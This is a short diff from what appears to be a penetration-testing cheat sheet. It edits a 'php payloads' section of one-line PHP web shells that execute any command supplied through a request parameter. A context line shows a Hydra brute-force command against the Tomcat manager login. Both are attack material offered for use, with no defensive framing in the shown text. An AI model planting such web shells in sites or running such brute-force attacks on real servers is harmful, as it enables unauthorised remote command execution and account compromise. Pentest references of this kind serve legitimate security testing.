@@ -283,7 +283,7 @@ hydra -l tomcat -P passfile.txt -t -s 443 -f <IP> http-get /manager/html -s 8080
 
 ### php payloads
 ```
-<?php echo system($_REQUEST ["cmd"]); ?>
+<?php system($_REQUEST ["cmd"]); ?>
 <?php system($_GET['cmd']);?>
 ```
 
